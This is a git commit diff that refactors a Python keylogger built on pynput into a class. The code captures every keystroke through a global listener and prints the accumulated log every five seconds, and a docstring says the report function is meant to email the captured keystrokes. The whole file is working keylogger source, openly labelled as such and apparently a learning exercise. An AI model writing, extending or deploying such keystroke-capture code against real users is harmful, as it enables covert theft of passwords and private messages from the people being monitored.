d57a5d855d5b1e5ea4353ead65b61d14a0e6a7f9
Tom Wittmann <TomWittmann@alumni.wfu.edu>
2020-05-05 21:59:45 -0400

    Changed to a class.

--- keylogger.py
+++ keylogger.py
@@ -6,37 +6,39 @@ import threading
 
 log = ""
 
-'''
-A callback function. A callback function is a function passed to a method so that the method
-can call the function when the method has completed its work. 
-'''
-def process_key_press(key):
-    global log  #Using global variable so it is not created every time.
+class Keylogger:
 
-    try:
-        log += str(key.char)
-    except AttributeError:  #If the key is not a character then an exception is thrown.fde df
-        if key == key.space:
-            log += " "
-        else:
-            log += str(key)
+    '''
+    A callback function. A callback function is a function passed to a method so that the method
+    can call the function when the method has completed its work.
+    '''
+    def process_key_press(self, key):
+        global log  #Using global variable so it is not created every time.
 
-'''
-Function to send an email about the user key strokes. Runs on a separate thread. 
-A function that calls itself is a recursive function.
-'''
-def report():
-    global log
-    print(log)
-    log = ""
-    timer = threading.Timer(5, report)    #After 5 seconds call the function report, runs on a separate thread.
-    timer.start()
+        try:
+            log += str(key.char)
+        except AttributeError:  #If the key is not a character then an exception is thrown.fde df
+            if key == key.space:
+                log += " "
+            else:
+                log += str(key)
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)    #Everytime a key is pressed print it.
+    '''
+    Function to send an email about the user key strokes. Runs on a separate thread. 
+    A function that calls itself is a recursive function.
+    '''
+    def report(self):
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(5, self.report)    #After 5 seconds call the function report, runs on a separate thread.
+        timer.start()
 
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    #Everytime a key is pressed print it.
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
 
 
 
